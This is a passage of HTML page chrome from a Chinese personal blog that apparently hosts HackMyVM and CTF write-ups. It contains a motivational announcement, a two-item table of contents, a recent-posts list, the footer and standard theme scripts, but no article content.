class="announcement_content">人一定要学会自渡；烦躁的时候不要说话，也不要做任何决定，安静的待会，成年人的烦恼好像和谁说都不合适，要学会自我消化，想开，看开，放开，睡前原谅一切，醒来便是重生，这个世界上从来没有感同身受，你可以消沉，也可以抱怨，甚至可以崩溃，但你一定要懂得自愈，这个世界上没有多少人心疼你，自渡是一种能力，渡人是一种格局，活着就该逢山开路，遇水架桥……</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">测试</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/02/27/hackmyvm-hero/" title="hackmyvm-hero"><img src="/img/essayhead/8.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hackmyvm-hero"/></a><div class="content"><a class="title" href="/2025/02/27/hackmyvm-hero/" title="hackmyvm-hero">hackmyvm-hero</a><time datetime="2025-02-26T16:00:00.000Z" title="发表于 2025-02-27 00:00:00">2025-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/24/hackmyvm-buster/" title="hackmyvm-buster"><img src="/img/essayhead/28.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hackmyvm-buster"/></a><div class="content"><a class="title" href="/2025/02/24/hackmyvm-buster/" title="hackmyvm-buster">hackmyvm-buster</a><time datetime="2025-02-23T16:00:00.000Z" title="发表于 2025-02-24 00:00:00">2025-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/15/2024.12.15CISCN&amp;%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B/" title="	"><img src="/img/essayhead/37.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="	"/></a><div class="content"><a class="title" href="/2024/12/15/2024.12.15CISCN&amp;%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B/" title="	">	</a><time datetime="2024-12-14T16:00:00.000Z" title="发表于 2024-12-15 00:00:00">2024-12-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/28/Golang%20gorm/" title="Go小记 Gorm模型"><img src="/img/essayhead/6.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go小记 Gorm模型"/></a><div class="content"><a class="title" href="/2024/11/28/Golang%20gorm/" title="Go小记 Gorm模型">Go小记 Gorm模型</a><time datetime="2024-11-27T16:00:00.000Z" title="发表于 2024-11-28 00:00:00">2024-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/17/golangSSH/" title="Go小记 使用Go实现SSH客户端"><img src="/img/essayhead/24.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go小记 使用Go实现SSH客户端"/></a><div class="content"><a class="title" href="/2024/11/17/golangSSH/" title="Go小记 使用Go实现SSH客户端">Go小记 使用Go实现SSH客户端</a><time datetime="2024-11-16T16:00:00.000Z" title="发表于 2024-11-17 00:00:00">2024-11-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/essayhead/8.webp')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Yliken</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
